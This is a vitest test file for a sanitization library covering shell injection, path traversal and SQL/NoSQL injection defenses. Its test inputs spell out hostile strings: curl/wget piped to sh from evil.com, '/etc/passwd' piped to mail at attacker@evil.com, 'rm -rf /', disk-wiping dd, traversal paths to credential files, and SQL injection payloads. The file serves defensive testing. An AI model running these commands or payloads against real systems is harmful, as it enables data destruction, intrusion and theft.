import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import path from 'node:path'
import {
  sanitizePath,
  isPathSafe,
  validatePathWithinBase,
  sanitizeCommand,
  containsDangerousCommand,
  validateCommandAllowlist,
  escapeShell,
  sanitizeSQL,
  containsSQLInjection,
  escapeSQL,
} from '@/lib/sanitize'
import { resolvePathWithinWorkspace } from '@/server/workspace-path'

/**
 * Injection Prevention Tests
 * Tests for shell injection, path traversal, and SQL/NoSQL injection prevention
 */

describe('Injection Prevention Tests', () => {
  describe('Shell Injection Prevention', () => {
    describe('Command Metacharacter Escaping', () => {
      it('escapes semicolons', () => {
        const input = 'ls; rm -rf /'
        const result = escapeShell(input)
        
        expect(result).toContain('\\;')
      })

      it('escapes ampersands', () => {
        const input = 'cmd1 && cmd2'
        const result = escapeShell(input)
        
        expect(result).toContain('\\&')
      })

      it('escapes pipes', () => {
        const input = 'cat file | grep secret'
        const result = escapeShell(input)
        
        expect(result).toContain('\\|')
      })

      it('escapes backticks', () => {
        const input = 'echo `whoami`'
        const result = escapeShell(input)
        
        expect(result).toContain('\\`')
      })

      it('escapes dollar signs', () => {
        const input = 'echo $PATH'
        const result = escapeShell(input)
        
        expect(result).toContain('\\$')
      })

      it('escapes parentheses', () => {
        const input = '$(whoami)'
        const result = escapeShell(input)
        
        expect(result).toContain('\\(')
        expect(result).toContain('\\)')
      })

      it('escapes curly braces', () => {
        const input = '${PATH}'
        const result = escapeShell(input)
        
        expect(result).toContain('\\{')
        expect(result).toContain('\\}')
      })

      it('escapes square brackets', () => {
        const input = 'ls [abc]'
        const result = escapeShell(input)
        
        expect(result).toContain('\\[')
        expect(result).toContain('\\]')
      })

      it('escapes angle brackets', () => {
        const input = 'cat < input > output'
        const result = escapeShell(input)
        
        expect(result).toContain('\\<')
        expect(result).toContain('\\>')
      })

      it('escapes exclamation marks', () => {
        const input = '!!'
        const result = escapeShell(input)
        
        expect(result).toContain('\\!')
      })

      it('escapes hash symbols', () => {
        const input = 'echo # comment'
        const result = escapeShell(input)
        
        expect(result).toContain('\\#')
      })

      it('escapes asterisks', () => {
        const input = 'ls *'
        const result = escapeShell(input)
        
        expect(result).toContain('\\*')
      })

      it('escapes question marks', () => {
        const input = 'ls ?'
        const result = escapeShell(input)
        
        expect(result).toContain('\\?')
      })

      it('escapes tildes', () => {
        const input = 'cd ~'
        const result = escapeShell(input)
        
        expect(result).toContain('\\~')
      })

      it('escapes carets', () => {
        const input = 'echo ^C'
        const result = escapeShell(input)
        
        expect(result).toContain('\\^')
      })

      it('escapes backslashes', () => {
        const input = 'echo \\'
        const result = escapeShell(input)
        
        expect(result).toContain('\\\\')
      })
    })

    describe('Dangerous Command Detection', () => {
      it('detects rm -rf', () => {
        expect(containsDangerousCommand('rm -rf /')).toBe(true)
        expect(containsDangerousCommand('rm -r /tmp')).toBe(true)
        expect(containsDangerousCommand('rm -f file')).toBe(true)
      })

      it('detects sudo', () => {
        expect(containsDangerousCommand('sudo rm file')).toBe(true)
        expect(containsDangerousCommand('sudo -i')).toBe(true)
      })

      it('detects chmod 777', () => {
        expect(containsDangerousCommand('chmod 777 file')).toBe(true)
      })

      it('detects chown', () => {
        expect(containsDangerousCommand('chown root file')).toBe(true)
      })

      it('detects mkfs', () => {
        expect(containsDangerousCommand('mkfs.ext4 /dev/sda')).toBe(true)
      })

      it('detects dd if=', () => {
        expect(containsDangerousCommand('dd if=/dev/zero of=/dev/sda')).toBe(true)
      })

      it('detects shutdown', () => {
        expect(containsDangerousCommand('shutdown -h now')).toBe(true)
      })

      it('detects reboot', () => {
        expect(containsDangerousCommand('reboot')).toBe(true)
      })

      it('detects poweroff', () => {
        expect(containsDangerousCommand('poweroff')).toBe(true)
      })

      it('detects halt', () => {
        expect(containsDangerousCommand('halt')).toBe(true)
      })

      it('detects init 0', () => {
        expect(containsDangerousCommand('init 0')).toBe(true)
      })

      it('detects kill -9', () => {
        expect(containsDangerousCommand('kill -9 1')).toBe(true)
      })

      it('detects killall', () => {
        expect(containsDangerousCommand('killall nginx')).toBe(true)
      })

      it('detects pkill', () => {
        expect(containsDangerousCommand('pkill -9 node')).toBe(true)
      })

      it('detects wget piped to sh', () => {
        expect(containsDangerousCommand('wget http://evil.com/script.sh | sh')).toBe(true)
      })

      it('detects curl piped to sh', () => {
        expect(containsDangerousCommand('curl http://evil.com/script.sh | sh')).toBe(true)
      })

      it('detects eval', () => {
        expect(containsDangerousCommand('eval "$cmd"')).toBe(true)
      })

      it('detects exec', () => {
        expect(containsDangerousCommand('exec /bin/bash')).toBe(true)
      })

      it('detects source', () => {
        expect(containsDangerousCommand('source ~/.bashrc')).toBe(true)
      })

      it('allows safe commands', () => {
        expect(containsDangerousCommand('ls -la')).toBe(false)
        expect(containsDangerousCommand('cat file.txt')).toBe(false)
        expect(containsDangerousCommand('echo hello')).toBe(false)
        expect(containsDangerousCommand('pwd')).toBe(false)
        expect(containsDangerousCommand('cd /tmp')).toBe(false)
      })
    })

    describe('Command Sanitization', () => {
      it('removes command substitution with $()', () => {
        const input = 'echo $(whoami)'
        const result = sanitizeCommand(input)
        
        expect(result).not.toContain('$(')
        expect(result).not.toContain(')')
      })

      it('removes command substitution with backticks', () => {
        const input = 'echo `whoami`'
        const result = sanitizeCommand(input)
        
        expect(result).not.toContain('`')
      })

      it('removes variable expansion', () => {
        const input = 'echo ${PATH}'
        const result = sanitizeCommand(input)
        
        expect(result).not.toContain('${')
        expect(result).not.toContain('}')
      })

      it('removes command chaining with semicolons', () => {
        const input = 'ls; rm -rf /'
        const result = sanitizeCommand(input)
        
        expect(result).not.toContain(';')
      })

      it('removes command chaining with ampersands', () => {
        const input = 'cmd1 && cmd2'
        const result = sanitizeCommand(input)
        
        expect(result).not.toContain('&')
      })

      it('removes piping', () => {
        const input = 'cat /etc/passwd | mail attacker@evil.com'
        const result = sanitizeCommand(input)
        
        expect(result).not.toContain('|')
      })

      it('removes dangerous commands', () => {
        const input = 'rm -rf /'
        const result = sanitizeCommand(input)
        
        expect(result).not.toMatch(/rm\s+-rf?/i)
      })

      it('preserves safe command content', () => {
        const input = 'ls -la /home/user'
        const result = sanitizeCommand(input)
        
        expect(result).toContain('ls')
        expect(result).toContain('-la')
      })
    })

    describe('Command Allowlist Validation', () => {
      const allowedCommands = ['ls', 'cat', 'echo', 'pwd', 'cd', 'npm', 'node']

      it('allows commands in allowlist', () => {
        expect(validateCommandAllowlist('ls -la', allowedCommands)).toBe(true)
        expect(validateCommandAllowlist('cat file.txt', allowedCommands)).toBe(true)
        expect(validateCommandAllowlist('echo hello', allowedCommands)).toBe(true)
      })

      it('blocks commands not in allowlist', () => {
        expect(validateCommandAllowlist('rm -rf /', allowedCommands)).toBe(false)
        expect(validateCommandAllowlist('wget http://evil.com', allowedCommands)).toBe(false)
        expect(validateCommandAllowlist('curl http://evil.com', allowedCommands)).toBe(false)
      })

      it('handles full paths to commands', () => {
        expect(validateCommandAllowlist('/bin/ls -la', allowedCommands)).toBe(true)
        expect(validateCommandAllowlist('/usr/bin/cat file', allowedCommands)).toBe(true)
      })

      it('handles Windows-style paths', () => {
        expect(validateCommandAllowlist('C:\\Windows\\ls', allowedCommands)).toBe(true)
      })

      it('is case-insensitive', () => {
        expect(validateCommandAllowlist('LS -la', allowedCommands)).toBe(true)
        expect(validateCommandAllowlist('CAT file', allowedCommands)).toBe(true)
      })

      it('rejects empty command', () => {
        expect(validateCommandAllowlist('', allowedCommands)).toBe(false)
      })

      it('rejects with empty allowlist', () => {
        expect(validateCommandAllowlist('ls', [])).toBe(false)
      })
    })

    describe('Shell Injection Attack Vectors', () => {
      const attackVectors = [
        { name: 'command substitution $(...)', input: '$(cat /etc/passwd)' },
        { name: 'command substitution backticks', input: '`cat /etc/passwd`' },
        { name: 'semicolon chaining', input: '; rm -rf /' },
        { name: 'ampersand chaining', input: '&& rm -rf /' },
        { name: 'pipe to shell', input: '| sh' },
        { name: 'newline injection', input: '\nrm -rf /' },
        { name: 'null byte injection', input: '\x00rm -rf /' },
        { name: 'variable expansion', input: '${IFS}rm${IFS}-rf${IFS}/' },
        { name: 'hex encoding', input: '\\x72\\x6d -rf /' },
        { name: 'octal encoding', input: '\\162\\155 -rf /' },
        { name: 'unicode encoding', input: '\u0072\u006d -rf /' },
      ]

      for (const vector of attackVectors) {
        it(`prevents ${vector.name}`, () => {
          const result = sanitizeCommand(vector.input)
          expect(result).not.toMatch(/rm\s+-rf/i)
          expect(result).not.toContain('|')
          expect(result).not.toContain(';')
          expect(result).not.toContain('&')
        })
      }
    })
  })

  describe('Path Traversal Prevention', () => {
    describe('Basic Path Traversal Detection', () => {
      it('detects ../', () => {
        expect(isPathSafe('../etc/passwd')).toBe(false)
        expect(isPathSafe('../../etc/passwd')).toBe(false)
        expect(isPathSafe('dir/../../../etc/passwd')).toBe(false)
      })

      it('detects ..\\', () => {
        expect(isPathSafe('..\\etc\\passwd')).toBe(false)
        expect(isPathSafe('..\\..\\etc\\passwd')).toBe(false)
      })

      it('detects URL-encoded traversal', () => {
        expect(isPathSafe('%2e%2e%2f')).toBe(false)
        expect(isPathSafe('%2e%2e/')).toBe(false)
        expect(isPathSafe('.%2e/')).toBe(false)
        expect(isPathSafe('%2e./')).toBe(false)
      })

      it('detects double URL-encoded traversal', () => {
        expect(isPathSafe('%252e%252e%252f')).toBe(false)
      })

      it('detects bare ..', () => {
        expect(isPathSafe('..')).toBe(false)
      })

      it('allows safe paths', () => {
        expect(isPathSafe('src/index.ts')).toBe(true)
        expect(isPathSafe('components/Button.tsx')).toBe(true)
        expect(isPathSafe('package.json')).toBe(true)
      })
    })

    describe('Path Sanitization', () => {
      it('removes ../ sequences', () => {
        const result = sanitizePath('../../../etc/passwd')
        expect(result).not.toContain('..')
      })

      it('removes ..\\ sequences', () => {
        const result = sanitizePath('..\\..\\etc\\passwd')
        expect(result).not.toContain('..')
      })

      it('removes URL-encoded traversal', () => {
        const result = sanitizePath('%2e%2e%2fetc/passwd')
        expect(result).not.toContain('%2e')
      })

      it('removes leading slashes', () => {
        const result = sanitizePath('/etc/passwd')
        expect(result).not.toMatch(/^\//)
      })

      it('removes dangerous characters', () => {
        const result = sanitizePath('file<>:"|?*name.txt')
        expect(result).not.toMatch(/[<>:"|?*]/)
      })

      it('removes null bytes', () => {
        const result = sanitizePath('file\x00.txt')
        expect(result).not.toContain('\x00')
      })

      it('removes control characters', () => {
        const result = sanitizePath('file\x1f\x1e.txt')
        expect(result).toBe('file.txt')
      })

      it('normalizes multiple slashes', () => {
        const result = sanitizePath('dir//subdir///file.txt')
        expect(result).not.toContain('//')
      })

      it('removes hidden file prefixes', () => {
        const result = sanitizePath('.hidden/file.txt')
        expect(result).not.toMatch(/^\./)
      })

      it('allows .gitkeep', () => {
        const result = sanitizePath('.gitkeep')
        expect(result).toBe('.gitkeep')
      })

      it('preserves valid paths', () => {
        const result = sanitizePath('src/components/Button.tsx')
        expect(result).toBe('src/components/Button.tsx')
      })
    })

    describe('Path Validation Within Base', () => {
      const basePath = '/home/user/project'

      it('allows paths within base', () => {
        expect(validatePathWithinBase('src/index.ts', basePath)).toBe(true)
        expect(validatePathWithinBase('package.json', basePath)).toBe(true)
      })

      it('rejects paths outside base', () => {
        expect(validatePathWithinBase('../../../etc/passwd', basePath)).toBe(false)
        expect(validatePathWithinBase('/etc/passwd', basePath)).toBe(false)
      })

      it('handles empty paths', () => {
        expect(validatePathWithinBase('', basePath)).toBe(false)
      })

      it('handles empty base', () => {
        expect(validatePathWithinBase('file.txt', '')).toBe(false)
      })
    })

    describe('Workspace Path Resolution', () => {
      const originalProjectPath = process.env.PROJECT_PATH

      beforeEach(() => {
        process.env.PROJECT_PATH = '/repo/workspace'
      })

      afterEach(() => {
        if (originalProjectPath === undefined) {
          delete process.env.PROJECT_PATH
        } else {
          process.env.PROJECT_PATH = originalProjectPath
        }
      })

      it('resolves paths within workspace', () => {
        const result = resolvePathWithinWorkspace('src/index.ts')
        expect(result.ok).toBe(true)
      })

      it('rejects paths outside workspace', () => {
        const result = resolvePathWithinWorkspace('../../../etc/passwd')
        expect(result.ok).toBe(false)
        expect(result.error).toContain('outside workspace root')
      })

      it('handles absolute paths within workspace', () => {
        const result = resolvePathWithinWorkspace('/repo/workspace/src/index.ts')
        expect(result.ok).toBe(true)
      })

      it('rejects absolute paths outside workspace', () => {
        const result = resolvePathWithinWorkspace('/etc/passwd')
        expect(result.ok).toBe(false)
      })

      it('handles null input', () => {
        const result = resolvePathWithinWorkspace(null)
        expect(result.ok).toBe(true)
      })

      it('handles undefined input', () => {
        const result = resolvePathWithinWorkspace(undefined)
        expect(result.ok).toBe(true)
      })
    })

    describe('Path Traversal Attack Vectors', () => {
      const attackVectors = [
        { name: 'basic traversal', input: '../../../etc/passwd' },
        { name: 'Windows traversal', input: '..\\..\\..\\windows\\system32\\config\\sam' },
        { name: 'URL encoded', input: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd' },
        { name: 'double URL encoded', input: '%252e%252e%252f' },
        { name: 'mixed encoding', input: '..%2f..%2f..%2fetc/passwd' },
        { name: 'null byte', input: '../../../etc/passwd%00.jpg' },
        { name: 'overlong UTF-8', input: '..%c0%af..%c0%af..%c0%afetc/passwd' },
        { name: 'backslash in URL', input: '..\\..\\..\\etc\\passwd' },
        { name: 'dot dot slash variations', input: '....//....//....//etc/passwd' },
        { name: 'absolute path', input: '/etc/passwd' },
        { name: 'Windows absolute', input: 'C:\\Windows\\System32\\config\\SAM' },
        { name: 'UNC path', input: '\\\\server\\share\\file' },
      ]

      for (const vector of attackVectors) {
        it(`blocks ${vector.name}`, () => {
          const sanitized = sanitizePath(vector.input)
          expect(sanitized).not.toContain('..')
          expect(sanitized).not.toMatch(/^[/\\]/)
          expect(sanitized).not.toMatch(/^[A-Za-z]:/)
        })
      }
    })
  })

  describe('SQL/NoSQL Injection Prevention', () => {
    describe('SQL Injection Detection', () => {
      it('detects SELECT statements', () => {
        expect(containsSQLInjection("' OR 1=1; SELECT * FROM users --")).toBe(true)
      })

      it('detects INSERT statements', () => {
        expect(containsSQLInjection("'; INSERT INTO users VALUES('admin','admin') --")).toBe(true)
      })

      it('detects UPDATE statements', () => {
        expect(containsSQLInjection("'; UPDATE users SET password='hacked' --")).toBe(true)
      })

      it('detects DELETE statements', () => {
        expect(containsSQLInjection("'; DELETE FROM users --")).toBe(true)
      })

      it('detects DROP statements', () => {
        expect(containsSQLInjection("'; DROP TABLE users --")).toBe(true)
      })

      it('detects UNION attacks', () => {
        expect(containsSQLInjection("' UNION SELECT username, password FROM users --")).toBe(true)
      })

      it('detects comment injection', () => {
        expect(containsSQLInjection("admin'--")).toBe(true)
        expect(containsSQLInjection("admin'/*")).toBe(true)
      })

      it('detects boolean-based injection', () => {
        expect(containsSQLInjection("' OR 1=1 --")).toBe(true)
        expect(containsSQLInjection("' AND 1=1 --")).toBe(true)
      })

      it('detects time-based injection', () => {
        expect(containsSQLInjection("'; WAITFOR DELAY '0:0:5' --")).toBe(true)
        expect(containsSQLInjection("'; BENCHMARK(10000000,SHA1('test')) --")).toBe(true)
        expect(containsSQLInjection("'; SLEEP(5) --")).toBe(true)
      })

      it('detects stacked queries', () => {
        expect(containsSQLInjection("'; SELECT * FROM users; DROP TABLE users --")).toBe(true)
      })

      it('allows safe input', () => {
        expect(containsSQLInjection('john.doe@example.com')).toBe(false)
        expect(containsSQLInjection('Hello World')).toBe(false)
        expect(containsSQLInjection('12345')).toBe(false)
      })
    })

    describe('SQL Escaping', () => {
      it('escapes single quotes', () => {
        const result = escapeSQL("O'Brien")
        expect(result).toBe("O''Brien")
      })

      it('escapes backslashes', () => {
        const result = escapeSQL('path\\to\\file')
        expect(result).toBe('path\\\\to\\\\file')
      })

      it('escapes null bytes', () => {
        const result = escapeSQL('test\x00value')
        expect(result).toBe('test\\0value')
      })

      it('escapes newlines', () => {
        const result = escapeSQL('line1\nline2')
        expect(result).toBe('line1\\nline2')
      })

      it('escapes carriage returns', () => {
        const result = escapeSQL('line1\rline2')
        expect(result).toBe('line1\\rline2')
      })

      it('escapes SUB character', () => {
        const result = escapeSQL('test\x1avalue')
        expect(result).toBe('test\\Zvalue')
      })

      it('handles empty input', () => {
        const result = escapeSQL('')
        expect(result).toBe('')
      })
    })

    describe('SQL Sanitization', () => {
      it('removes SELECT statements', () => {
        const result = sanitizeSQL("'; SELECT * FROM users --")
        expect(result.toUpperCase()).not.toContain('SELECT')
      })

      it('removes DROP statements', () => {
        const result = sanitizeSQL("'; DROP TABLE users --")
        expect(result.toUpperCase()).not.toContain('DROP')
      })

      it('removes UNION attacks', () => {
        const result = sanitizeSQL("' UNION SELECT password FROM users --")
        expect(result.toUpperCase()).not.toContain('UNION')
      })

      it('removes comment markers', () => {
        const result = sanitizeSQL("admin'--")
        expect(result).not.toContain('--')
      })

      it('preserves safe content', () => {
        const result = sanitizeSQL('john.doe@example.com')
        expect(result).toContain('john.doe')
        expect(result).toContain('example.com')
      })
    })

    describe('NoSQL Injection Prevention', () => {
      interface NoSQLQuery {
        [key: string]: unknown
      }

      function sanitizeNoSQLQuery(query: NoSQLQuery): NoSQLQuery {
        const sanitized: NoSQLQuery = {}
        
        for (const [key, value] of Object.entries(query)) {
          if (key.startsWith('$')) {
            continue
          }
          
          if (typeof value === 'object' && value !== null) {
            const hasOperator = Object.keys(value as object).some(k => k.startsWith('$'))
            if (hasOperator) {
              continue
            }
            sanitized[key] = sanitizeNoSQLQuery(value as NoSQLQuery)
          } else {
            sanitized[key] = value
          }
        }
        
        return sanitized
      }

      function containsNoSQLInjection(input: unknown): boolean {
        if (typeof input === 'string') {
          return input.includes('$') && /\$\w+/.test(input)
        }
        
        if (typeof input === 'object' && input !== null) {
          for (const key of Object.keys(input)) {
            if (key.startsWith('$')) return true
            if (containsNoSQLInjection((input as Record<string, unknown>)[key])) return true
          }
        }
        
        return false
      }

      it('detects $where operator', () => {
        const query = { $where: 'this.password.length > 0' }
        expect(containsNoSQLInjection(query)).toBe(true)
      })

      it('detects $gt operator in value', () => {
        const query = { password: { $gt: '' } }
        expect(containsNoSQLInjection(query)).toBe(true)
      })

      it('detects $ne operator', () => {
        const query = { username: { $ne: '' } }
        expect(containsNoSQLInjection(query)).toBe(true)
      })

      it('detects $regex operator', () => {
        const query = { username: { $regex: '.*' } }
        expect(containsNoSQLInjection(query)).toBe(true)
      })

      it('detects nested operators', () => {
        const query = { user: { profile: { role: { $ne: 'user' } } } }
        expect(containsNoSQLInjection(query)).toBe(true)
      })

      it('removes $where operator', () => {
        const query = { $where: 'this.password.length > 0', username: 'admin' }
        const sanitized = sanitizeNoSQLQuery(query)
        expect(sanitized).not.toHaveProperty('$where')
        expect(sanitized).toHaveProperty('username', 'admin')
      })

      it('removes $gt operator', () => {
        const query = { password: { $gt: '' } }
        const sanitized = sanitizeNoSQLQuery(query)
        expect(sanitized).not.toHaveProperty('password')
      })

      it('allows safe queries', () => {
        const query = { username: 'admin', email: 'admin@example.com' }
        expect(containsNoSQLInjection(query)).toBe(false)
        
        const sanitized = sanitizeNoSQLQuery(query)
        expect(sanitized).toEqual(query)
      })

      it('detects operator in string', () => {
        const input = '{"$gt": ""}'
        expect(containsNoSQLInjection(input)).toBe(true)
      })
    })

    describe('SQL Injection Attack Vectors', () => {
      const attackVectors = [
        { name: 'classic OR 1=1', input: "' OR 1=1 --" },
        { name: 'UNION based', input: "' UNION SELECT * FROM users --" },
        { name: 'stacked queries', input: "'; DROP TABLE users; --" },
        { name: 'comment bypass', input: "admin'/*" },
        { name: 'double dash comment', input: "admin'--" },
        { name: 'hash comment', input: "admin'#" },
        { name: 'time-based blind', input: "'; WAITFOR DELAY '0:0:5' --" },
        { name: 'boolean blind', input: "' AND 1=1 --" },
        { name: 'error-based', input: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --" },
        { name: 'second order', input: "admin'; UPDATE users SET role='admin' WHERE username='admin'--" },
        { name: 'hex encoding', input: "0x27204f5220313d31202d2d" },
        { name: 'char encoding', input: "CHAR(39)+OR+1=1--" },
      ]

      for (const vector of attackVectors) {
        it(`detects ${vector.name}`, () => {
          expect(containsSQLInjection(vector.input)).toBe(true)
        })
      }
    })

    describe('Parameterized Query Simulation', () => {
      function simulateParameterizedQuery(
        template: string,
        params: Record<string, string>
      ): { safe: boolean; query: string } {
        let query = template
        
        for (const [key, value] of Object.entries(params)) {
          if (containsSQLInjection(value)) {
            return { safe: false, query: '' }
          }
          const escaped = escapeSQL(value)
          query = query.replace(`:${key}`, `'${escaped}'`)
        }
        
        return { safe: true, query }
      }

      it('safely handles normal input', () => {
        const result = simulateParameterizedQuery(
          'SELECT * FROM users WHERE username = :username',
          { username: 'john' }
        )
        
        expect(result.safe).toBe(true)
        expect(result.query).toContain("'john'")
      })

      it('escapes quotes in input', () => {
        const result = simulateParameterizedQuery(
          'SELECT * FROM users WHERE name = :name',
          { name: "O'Brien" }
        )
        
        expect(result.safe).toBe(true)
        expect(result.query).toContain("O''Brien")
      })

      it('rejects SQL injection attempts', () => {
        const result = simulateParameterizedQuery(
          'SELECT * FROM users WHERE username = :username',
          { username: "' OR 1=1 --" }
        )
        
        expect(result.safe).toBe(false)
      })

      it('rejects UNION injection', () => {
        const result = simulateParameterizedQuery(
          'SELECT * FROM users WHERE id = :id',
          { id: "1 UNION SELECT * FROM passwords" }
        )
        
        expect(result.safe).toBe(false)
      })
    })
  })
})
